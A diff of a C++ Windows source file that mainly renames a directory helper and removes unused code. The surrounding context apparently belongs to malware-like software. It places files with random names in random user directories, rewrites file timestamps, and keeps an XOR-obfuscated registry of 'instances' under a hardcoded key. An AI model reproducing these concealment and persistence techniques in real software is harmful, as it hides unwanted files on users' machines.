@@ -26,10 +26,6 @@
 #include <iomanip>
 #include <cctype>
 
-#pragma comment(lib, "shell32.lib")
-#pragma comment(lib, "advapi32.lib")
-#pragma comment(lib, "iphlpapi.lib")
-
 namespace {
     const char* SECRET_KEY = "cwj_rocks_2026";
     const char* REGISTRY_FILE = "instances.json";
@@ -97,7 +93,7 @@ namespace {
 
     bool SafeCopy(const std::string& src, const std::string& dst);
 
-    void EnsureDir(const std::string& path) {
+    void EnsureDirectory(const std::string& path) {
         CreateDirectoryA(path.c_str(), NULL);
     }
 
@@ -173,7 +169,7 @@ namespace {
     std::string SelectSmartTarget() {
         auto dirs = GetUserDirectories();
         std::string dir = dirs[rand() % dirs.size()];
-        EnsureDir(dir);
+        EnsureDirectory(dir);
 
         bool use_extension = rand() % 2 == 0;
         std::string name = use_extension ? GenerateRandomExtensionName() : GenerateRandomName();
@@ -185,10 +181,7 @@ namespace {
         return attrs != INVALID_FILE_ATTRIBUTES;
     }
 
-    bool IsDirectory(const std::string& path) {
-        auto attrs = GetFileAttributesA(path.c_str());
-        return attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY);
-    }
+    
 
     bool SetFileTime(const std::string& path, const FILETIME& creation, const FILETIME& lastAccess, const FILETIME& lastWrite) {
         HANDLE hFile = CreateFileA(path.c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -264,8 +257,6 @@ namespace {
         std::string json = XOREncrypt(buffer.str());
 
         try {
-            size_t pos = 0;
-
             size_t instancesStart = json.find("\"instances\"");
             if (instancesStart != std::string::npos) {
                 size_t arrStart = json.find("[", instancesStart);
@@ -322,7 +313,7 @@ namespace {
     }
 
     void SaveRegistry(const InstanceData& data) {
-        EnsureDir(GetAppDataPath());
+        EnsureDirectory(GetAppDataPath());
 
         std::string json = "{";
         json += "\"instances\":[";
@@ -425,7 +416,7 @@ namespace {
         size_t pos = dir.find_last_of("\\/");
         if (pos != std::string::npos) {
             dir = dir.substr(0, pos);
-            EnsureDir(dir);
+            EnsureDirectory(dir);
         }
 
         if (CopyFileA(src.c_str(), dst.c_str(), TRUE)) {
@@ -454,7 +445,7 @@ namespace {
         size_t pos = dir.find_last_of("\\/");
         if (pos != std::string::npos) {
             dir = dir.substr(0, pos);
-            EnsureDir(dir);
+            EnsureDirectory(dir);
         }
 
         if (MoveFileA(src.c_str(), dst.c_str())) {
